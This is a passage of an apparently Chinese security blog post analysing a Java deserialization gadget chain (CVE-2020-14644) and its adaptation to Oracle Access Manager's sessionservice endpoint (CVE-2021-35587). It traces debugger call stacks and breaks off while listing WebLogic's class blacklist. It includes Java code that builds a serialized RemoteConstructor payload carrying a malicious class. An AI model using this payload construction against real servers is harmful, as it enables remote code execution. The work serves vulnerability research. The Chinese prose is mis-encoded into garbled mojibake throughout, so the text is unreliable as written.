alt=image-20220713200651318></p><p>è·Ÿè¿›æŸ¥çœ‹defineClasså¦‚ä½•èµ·ä½œç”¨ï¼Ÿ</p><p>ç¬¬83è¡Œå¯¹ç±»ååšäº†æ›¿æ¢</p><p><img loading=lazy src=image-20220713201158026.png alt=image-20220713201158026></p><p>è¿™æ˜¯å› ä¸ºåˆ›å»ºClassIdentityçš„æ—¶å€™åšäº†æ›¿æ¢</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-61-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-61-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.ClassIdentity
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>ClassIdentity</span><span style=color:#f92672>(</span>Class<span style=color:#f92672>&lt;?&gt;</span> clazz<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>(</span>clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getPackage</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>replace</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>),</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>substring</span><span style=color:#f92672>(</span>clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>lastIndexOf</span><span style=color:#f92672>(</span><span style=color:#ae81ff>46</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>),</span> Base<span style=color:#f92672>.</span><span style=color:#a6e22e>toHex</span><span style=color:#f92672>(</span>md5<span style=color:#f92672>(</span>clazz<span style=color:#f92672>)));</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è·Ÿè¿›defineClassï¼Œæœ€ç»ˆä¼šæ¥åˆ°</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-62-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-62-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ClassLoader</span><span style=color:#960050;background-color:#1e0010>#</span>defineClass<span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[],</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>,</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ProtectionDomain</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å…¶ä¸­çš„defineClass1æ˜¯nativeä»£ç äº†</p><p><img loading=lazy src=image-20220713202547432.png alt=image-20220713202547432></p><p><img loading=lazy src=image-20220713202618096.png alt=image-20220713202618096></p><h5 id=å®ä¾‹åŒ–æ¶æ„ç±»createinstance>å®ä¾‹åŒ–æ¶æ„ç±»ï¼šcreateInstance<a hidden class=anchor aria-hidden=true href=#å®ä¾‹åŒ–æ¶æ„ç±»createinstance>#</a></h5><p>çœŸæ­£çš„sinkç‚¹åœ¨createInstanceï¼š</p><p><img loading=lazy src=image-20220713191543468.png alt=image-20220713191543468></p><p>è·å–test7çš„æ„é€ å‡½æ•°å¹¶è°ƒç”¨</p><p><img loading=lazy src=image-20220713191749943.png alt=image-20220713191749943></p><p>è°ƒç”¨åˆ°nativeä»£ç </p><p><img loading=lazy src=image-20220713192142582.png alt=image-20220713192142582></p><p>è¿™é‡Œä¸çŸ¥ä¸ºä½•æ²¡æœ‰èµ°åˆ° java.lang.invoke.MethodHandle#invokeExact</p><p><img loading=lazy src=image-20220713192840418.png alt=image-20220713192840418></p><p>è€Œæ˜¯èµ°åˆ°äº† java.lang.invoke.Invokers#checkExactTypeï¼Œå¹¶ä¸”è°ƒç”¨æ ˆç»è¿‡äº†ä¸€å¤„ java.lang.invoke.LambdaForm#LambdaForm æš‚æ—¶æ²¡ææ‡‚æ˜¯ä»€ä¹ˆé­”æ³•ã€‚</p><p><img loading=lazy src=image-20220713192944938.png alt=image-20220713192944938></p><p>ç„¶åè·³è½¬åˆ° LambdaForm ï¼Œèµ°åˆ° java.lang.invoke.Invokers#checkCustomized</p><p><img loading=lazy src=image-20220713193314126.png alt=image-20220713193314126></p><p>ç„¶åè·³è½¬åˆ° LambdaForm ï¼Œèµ°åˆ° java.lang.invoke.MethodHandleImpl#checkSpreadArgument</p><p><img loading=lazy src=image-20220713193421651.png alt=image-20220713193421651></p><p>ç„¶åè·³è½¬åˆ° LambdaForm ï¼Œèµ°åˆ° java.lang.invoke.Invokers#checkGenericType</p><p><img loading=lazy src=image-20220713193532967.png alt=image-20220713193532967></p><p>ç„¶åè·³è½¬åˆ° LambdaForm ï¼Œåˆèµ°åˆ° java.lang.invoke.Invokers#checkCustomized</p><p>ç„¶åè·³è½¬åˆ° LambdaFormï¼Œèµ°åˆ° java.lang.invoke.DirectMethodHandle#allocateInstance</p><p><img loading=lazy src=image-20220713193812779.png alt=image-20220713193812779></p><p>sun.misc.Unsafe#allocateInstanceå®šä¹‰å¦‚ä¸‹</p><p><img loading=lazy src=image-20220713193927133.png alt=image-20220713193927133></p><p>æ ¹æ®æè¿°ï¼ŒallocateInstanceè¿™ä¸ªnativeå‡½æ•°åªæ˜¯åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œä½†æ²¡æœ‰æ‰§è¡Œä»»ä½•æ„é€ å‡½æ•°ã€‚ä¹Ÿç¡®å®è§‚å¯Ÿåˆ°ï¼Œåˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬çš„touchæ–‡ä»¶çš„æ“ä½œéƒ½è¿˜æ˜¯æ²¡æœ‰å‘ç”Ÿã€‚</p><p>åˆç»è¿‡ä¸€ä¸ªé­”æ³•èˆ¬çš„LambdaFormè·³è½¬ï¼Œæˆ‘ä»¬æ¥åˆ°äº† java.lang.invoke.DirectMethodHandle#constructorMethod</p><p><img loading=lazy src=image-20220713194159162.png alt=image-20220713194159162></p><h5 id=æ‰§è¡Œæ„é€ å‡½æ•°æ¶æ„ä»£ç >æ‰§è¡Œæ„é€ å‡½æ•°ï¼ˆæ¶æ„ä»£ç ï¼‰<a hidden class=anchor aria-hidden=true href=#æ‰§è¡Œæ„é€ å‡½æ•°æ¶æ„ä»£ç >#</a></h5><p>åˆä¸€æ¬¡ä¸çŸ¥é“æ€ä¹ˆå‘ç”Ÿçš„LambdaFormè·³è½¬ä¹‹åï¼Œæˆ‘ä»¬æ¥åˆ°äº†test7çš„æ„é€ å‡½æ•°ã€‚</p><p><img loading=lazy src=image-20220713194252353.png alt=image-20220713194252353></p><p>æ­¤æ—¶å®Œæ•´çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><p><img loading=lazy src=image-20220713194738012.png alt=image-20220713194738012></p><p>è‡³æ­¤æˆ‘ä»¬å°±å®Œæˆäº†æ•´ä¸ªgadgetçš„è·Ÿè¸ªã€‚</p><h5 id=è¿”å›åˆ›å»ºçš„å¯¹è±¡>è¿”å›åˆ›å»ºçš„å¯¹è±¡<a hidden class=anchor aria-hidden=true href=#è¿”å›åˆ›å»ºçš„å¯¹è±¡>#</a></h5><p>å›åˆ°æœ€å¼€å§‹çš„åœ°æ–¹ï¼Œå°†objæ›¿æ¢ä¸ºrep</p><p><img loading=lazy src=image-20220713195827024.png alt=image-20220713195827024></p><p>è¿™é‡Œcheckä¸ºnull</p><p><img loading=lazy src=image-20220713195933608.png alt=image-20220713195933608></p><p>ç›´æ¥è¿”å›repå¯¹è±¡ä½œä¸ºæœ€ç»ˆç»“æœã€‚</p><h3 id=æ„é€ payload>æ„é€ payload<a hidden class=anchor aria-hidden=true href=#æ„é€ payload>#</a></h3><h3 id=ç›´æ¥ä½¿ç”¨gadgetclassnotfoundexception>ç›´æ¥ä½¿ç”¨gadgetï¼šClassNotFoundException<a hidden class=anchor aria-hidden=true href=#ç›´æ¥ä½¿ç”¨gadgetclassnotfoundexception>#</a></h3><p>å°†CVE-2020-14644çš„è¿™æ¡gadgetçš„åºåˆ—åŒ–æ•°æ®å°è£…æˆæ¥å£ <code>/oam/server/opensso/sessionservice</code> èƒ½å¤Ÿå¤„ç†çš„æ•°æ®ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-63-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-63-17>17</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2020_14644</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> test7<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            String sobj <span style=color:#f92672>=</span> oamserialize<span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>sobj<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿›å…¥åˆ°readOrdinaryObject()</p><p><img loading=lazy src=image-20220714101700984.png alt=image-20220714101700984></p><p>isInstantiable()è¿”å›false</p><p><img loading=lazy src=image-20220714103354981.png alt=image-20220714103354981></p><p>è¿™ä¸ªæ–¹æ³•åœ¨1.ï¼‰ç±»æ˜¯externalizable çš„ä¸”æœ‰publicçš„æ— å‚æ„é€ å™¨2.ï¼‰ç±»æ˜¯non-externalizableä¸”ç¬¬ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çˆ¶ç±»æœ‰å¯è®¿é—®çš„æ— å‚æ„é€ å™¨æ—¶è¿”å›trueï¼Œå…¶ä½™æ—¶å€™è¿”å›falseã€‚</p><p>externalizableå’Œserializableçš„åŒºåˆ«ï¼šç®€å•æ¥è¯´ï¼Œå‰è€…å¯ä»¥ä¿å­˜å¯¹è±¡çš„å…¨éƒ¨æˆ–ä¸€éƒ¨åˆ†çš„çŠ¶æ€ï¼Œè¿‡ç¨‹å®Œå…¨ç”±ç¨‹åºé€»è¾‘æ§åˆ¶ï¼Œåè€…å¿…é¡»å…¨éƒ¨ä¿å­˜ï¼Œè¿‡ç¨‹ç”±JVMå®Œå…¨æ§åˆ¶ã€‚</p><blockquote><p><strong>The process of writing the state of an object to a file is called serialization</strong>, but strictly speaking, it is the process of converting an object from java supported form into a file-supported form or network-supported form by using fileOutputStream and objectOutputStream classes we can implement serialization.</p><p>But we can serialize only serializable objects. An object is said to be serializable if and only if the corresponding class implements a Serializable interface. Serializable interface is present in java.io package, and it doesnâ€™t contain any method and hence it is a marker interface. If we are trying to serializable a non-serializable object then we will get Runtime Exception saying notSerializableException.</p><p>&mldr;</p><p><strong>In serialization, everything is taken care of by JVM and the programmer doesnâ€™t have any control.</strong> In serialization, it is always possible to solve the total object to file, and <strong>it is not possible to save part of the object</strong> which may create performance problems. To overcome this problem we should go for externalization.</p><p>The main advantage of Externalizable over serialization is, <strong>everything is taken care of by the programmer and JVM doesnâ€™t have any control.</strong> Based on our requirements <strong>we can save either the total object or part of the object</strong> which improves the performance of the system. To provide the generalizable ability for any java object, itâ€™s a mandate for the corresponding class to implement a generalizable interface.</p><p>&mldr;</p><p>â€”â€”https://www.geeksforgeeks.org/difference-between-serializable-and-externalizable-in-java-serialization/</p></blockquote><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªnon-externalizableçš„ç±»ï¼Œè€Œcom.tangosol.internal.util.invoke.RemoteConstructoræ˜¯æœ‰æ— å‚æ„é€ å™¨çš„ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¼šè¿”å›falseå‘¢ï¼Ÿ</p><p><img loading=lazy src=image-20220714110447494.png alt=image-20220714110447494></p><p>å¯¹æ¯”CVE-2020-14644çš„ObjectStreamClasså¯¹è±¡descå’ŒCVE-2021-35587çš„desc</p><p>åè€…æ²¡æœ‰æ‰¾åˆ°æ„é€ å™¨cons</p><p><img loading=lazy src=image-20220714115825664.png alt=image-20220714115825664></p><p>å‰è€…æœ‰</p><p><img loading=lazy src=image-20220714115911777.png alt=image-20220714115911777></p><p>æ‰€ä»¥åè€…çš„isInstantiable()è¿”å›äº†falseã€‚</p><p>è‡³äºä¸ºä»€ä¹ˆä¸¤ç§ç¯å¢ƒä¸‹è¯†åˆ«åˆ°çš„consä¸åŒï¼Œè®©æˆ‘ä»¬è·Ÿå…¥ <code>java.io.ObjectInputStream#readClassDesc</code> å¯¹æ¯”ä¸€ä¸‹ã€‚</p><p>ä¼šè¿›å…¥åˆ°readNonProxyDesc(boolean unshared)</p><p><img loading=lazy src=image-20220714111616759.png alt=image-20220714111616759></p><p><img loading=lazy src=image-20220714141606125.png alt=image-20220714141606125></p><p><img loading=lazy src=image-20220714141709907.png alt=image-20220714141709907></p><p>weblogicç¯å¢ƒä¸‹ï¼ŒClassLoaderæ˜¯ sun.misc.Launcher.AppClassLoader#AppClassLoaderï¼ŒåŠ è½½äº†134ä¸ªç±»</p><p><img loading=lazy src=image-20220714142930193.png alt=image-20220714142930193></p><p><code>class com.tangosol.internal.util.invoke.RemoteConstructor</code> å°±åœ¨å…¶ä¸­</p><p><img loading=lazy src=image-20220714143114667.png alt=image-20220714143114667></p><p>æ‰§è¡Œä»¥ä¸‹ä»£ç ç¡®è®¤å­˜åœ¨</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-64-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-64-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>Iterator iterator<span style=color:#f92672>=</span>latestUserDefinedLoader<span style=color:#f92672>().</span><span style=color:#a6e22e>classes</span><span style=color:#f92672>.</span><span style=color:#a6e22e>iterator</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>String res<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()){</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>iterator<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>().</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;class com.tangosol.internal.util.invoke.RemoteConstructor&#34;</span><span style=color:#f92672>))</span>res<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;exist&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>res
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220714144823617.png alt=image-20220714144823617></p><p>äºæ˜¯æˆåŠŸè·å–åˆ°ç±»</p><p><img loading=lazy src=image-20220714143232448.png alt=image-20220714143232448></p><p>weblogicç¯å¢ƒä¸­å®Œæˆresolveä»¥åï¼Œè¿˜ä¼šè¿›å…¥ filterChecké»‘åå•æ ¡éªŒ</p><p><img loading=lazy src=image-20220714160408957.png alt=image-20220714160408957></p><p><img loading=lazy src=image-20220714114515979.png alt=image-20220714114515979></p><p>é»‘åå•åˆ—è¡¨å¦‚ä¸‹</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-65-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-65-16>16</a>
